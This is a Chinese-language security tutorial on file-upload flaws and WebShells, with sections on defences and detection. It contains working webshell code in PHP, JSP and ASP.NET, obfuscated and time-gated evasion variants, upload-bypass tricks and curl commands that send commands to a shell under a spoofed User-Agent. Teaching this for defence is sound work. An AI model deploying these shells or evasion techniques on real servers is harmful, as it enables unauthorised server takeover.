# 文件上传与WebShell

## 概述

文件上传功能是Web应用中最常见的高危入口之一。攻击者利用不安全的文件上传机制上传恶意文件（WebShell），获得服务器控制权。WebShell是一段运行在服务器上的脚本代码，攻击者通过HTTP请求向WebShell发送命令，间接操作目标系统。

## 文件上传漏洞

### 文件上传过滤机制

典型的文件上传处理流程：

```php
// 漏洞代码：不完整的上传验证
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
```

### 扩展名绕过

#### 双重扩展名

```text
# Apache多后缀解析特性（从右向左解析）
shell.php.jpg        → 当作jpg处理（若AddType配置）
shell.php.abc.xyz    → 未知扩展名可能当作php
shell.php%00.jpg     → 空字节截断（PHP 5.3.4之前）
shell.php;.jpg       → 参数截断（旧版本IIS和某些CGI）
shell.asp;.jpg       → IIS 6.0 ASP解析漏洞
```

#### .htaccess绕过

上传`.htaccess`文件覆盖服务器配置，使任意文件作为PHP执行：

```text
# .htaccess内容
AddType application/x-httpd-php .jpg
AddHandler php5-script .jpg
SetHandler application/x-httpd-php

# 之后上传shell.jpg即可作为PHP执行
```

#### web.config绕过（IIS）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="GET" 
           modules="FastCgiModule" 
           resourceType="Unspecified" 
           requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
```

### MIME类型绕过

拦截并修改Content-Type：

```bash
# 原始请求
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# 修改为允许的MIME
Content-Type: image/jpeg
```

### Magic Byte注入

在文件开头添加图片文件的Magic Bytes：

```bash
# 创建伪装成图片的PHP文件
echo -n -e '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# 其他Magic Bytes
# GIF89a → \x47\x49\x46\x38\x39\x61
# PNG → \x89\x50\x4E\x47
# JPEG → \xFF\xD8\xFF\xE0
```

### 竞争条件上传

利用文件上传验证和实际存储之间的时间差：

```php
// 受保护的验证逻辑
$uploaded = $_FILES['file'];
if (getimagesize($uploaded['tmp_name'])) {
    // 通过验证后移动到上传目录
    move_uploaded_file($uploaded['tmp_name'], 'uploads/' . $uploaded['name']);
}
// 攻击者竞争：在验证后、移动前，用恶意文件替换临时文件
```

## WebShell

### PHP WebShell

```php
<!-- 最小化WebShell -->
<?php system($_GET['cmd']);?>

<!-- 带密码保护的WebShell -->
<?php
$password = 'secret123';
if ($_GET['pass'] === $password) {
    system($_GET['cmd']);
}
?>

<!-- 隐蔽WebShell（隐藏参数名） -->
<?php
$a = $_SERVER['HTTP_USER_AGENT'];
$b = base64_decode($a);
system($b);
?>

<!-- 图片马（隐藏于图片） -->
GIF89a
<?php system($_GET['cmd']);?>

<!-- 多功能WebShell -->
<?php
$cmd = $_POST['cmd'];
$type = $_POST['type'];

if ($type == 'exec') {
    echo "<pre>" . shell_exec($cmd) . "</pre>";
} elseif ($type == 'file') {
    echo file_get_contents($cmd);
} elseif ($type == 'upload') {
    file_put_contents($_FILES['file']['name'], file_get_contents($_FILES['file']['tmp_name']));
    echo "uploaded";
}
?>
```

### JSP WebShell

```jsp
<!-- 基础JSP WebShell -->
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>
```

### ASP.NET WebShell

```asp
<!-- ASP.NET WebShell -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
```

### WebShell管理工具

| 工具 | 支持语言 | 特点 |
|------|----------|------|
| 冰蝎（Behinder） | JSP/PHP/ASPX | AES加密流量，动态密钥 |
| 蚁剑（AntSword） | PHP/JSP/ASPX | 开源，插件丰富 |
| 哥斯拉（Godzilla） | JSP/PHP/ASPX | 加密混淆，免杀效果好 |
| Cknife | PHP/JSP/ASPX | 中国菜刀后继项目 |
| weevely | PHP | 自动生成和连接WebShell |

蚁剑连接示例：

```text
# URL: http://target.com/shell.php
# 密码: antSword
# 编码器: base64
# 类型: PHP
```

## 检测规避技术

### Base64编码

```php
<?php
// 通过base64解码执行命令
$cmd = base64_decode($_POST['cmd']);
system($cmd);

// 双重编码
// 客户端编码：cmd → base64 → URL编码
// 服务端解码：URL解码 → base64解码 → 执行
?>
```

### 字符串混淆

```php
<?php
// 字符串拼接混淆
$a = "sy";
$b = "st";
$c = "em";
$f = $a.$b.$c;
$f($_GET['c']);

// 字符编码混淆
$_ = "\x73\x79\x73\x74\x65\x6d"; // "system"
$_(base64_decode($_GET['c']));

// 字符串反转
$_ = strrev("metsys");
$_(base64_decode($_POST['c']));
?>
```

### User-Agent伪装

```bash
# 模拟搜索引擎爬虫
curl -X POST http://target.com/shell.php \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
  -d "cmd=id"

# 模拟正常API请求
curl -X POST http://target.com/api/upload.php \
  -H "User-Agent: axios/0.21.1" \
  -d "cmd=ls -la"
```

### 时间混淆

```php
<?php
// 仅在特定时间段执行
$hour = date('H');
if ($hour > 2 && $hour < 5) {
    // 凌晨3-5点执行恶意操作
    $cmd = base64_decode($_POST['cmd']);
    system($cmd);
} else {
    // 正常返回
    echo "File uploaded successfully";
}
?>
```

## 防御措施

### 文件上传安全配置

```php
// PHP安全配置
// php.ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
upload_max_filesize = 2M
post_max_size = 8M

// Nginx上传目录禁用PHP执行
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}

// Apache .htaccess
<FilesMatch "\.(?i:php|php3|php4|php5|phtml|pl|py|jsp|asp|htm|html|shtml|sh|cgi)">
    deny from all
</FilesMatch>
```

### 安全实现

```python
# Python Flask安全文件上传
import os
import magic
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
UPLOAD_PATH = '/var/www/uploads'
MAX_FILE_SIZE = 2 * 1024 * 1024  # 2MB

def is_allowed_file(filename):
    ext = filename.rsplit('.', 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False
    return True

def is_valid_content(filepath):
    mime = magic.from_file(filepath, mime=True)
    return mime in ['image/jpeg', 'image/png', 'image/gif']

def upload_safe(file):
    # 检查文件大小
    file.seek(0, os.SEEK_END)
    if file.tell() > MAX_FILE_SIZE:
        raise Exception("File too large")
    file.seek(0)
    
    # 生成安全的文件名
    filename = secure_filename(file.filename)
    extension = filename.rsplit('.', 1)[1].lower()
    
    # 使用UUID重命名
    import uuid
    safe_name = f"{uuid.uuid4().hex}.{extension}"
    
    # 保存到非Web可访问目录
    safe_path = os.path.join(UPLOAD_PATH, safe_name)
    file.save(safe_path)
    
    # 验证文件内容
    if not is_valid_content(safe_path):
        os.remove(safe_path)
        raise Exception("Invalid content")
    
    # 重新压缩图片（移除隐藏内容）
    from PIL import Image
    img = Image.open(safe_path)
    img.convert('RGB').save(safe_path, 'JPEG')
    
    return safe_name
```

### 防御清单

- **扩展名白名单**：只允许必要的文件类型（如.jpg, .png, .pdf）
- **文件内容验证**：使用MIME检测库验证文件内容真实性
- **重命名文件**：使用UUID重命名，防止文件名注入
- **存储隔离**：上传文件存储到非Web根目录或独立域名
- **限制执行权限**：上传目录禁用脚本执行权限
- **防病毒扫描**：上传文件后使用ClamAV等工具扫描
- **限制文件大小**：设置合理的文件大小上限
- **图片重压缩**：对上传图片重新编码以移除隐藏内容
- **CDR技术**：使用Content Disarm & Reconstruction技术重建文件
- **WebShell检测工具**：部署基于签名的WebShell检测系统

## WebShell检测技术

- **静态检测**：正则匹配危险函数、Base64解码、eval等特征
- **动态检测**：监控进程创建、文件写入、网络连接等行为
- **日志分析**：分析异常访问日志（大量参数传递、POST请求）
- **文件完整性监控**：监控Web目录文件变更

## 参考资源

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [蚁剑](https://github.com/AntSwordProject/antSword)
- [冰蝎](https://github.com/rebeyond/Behinder)
- [哥斯拉](https://github.com/BeichenDream/Godzilla)
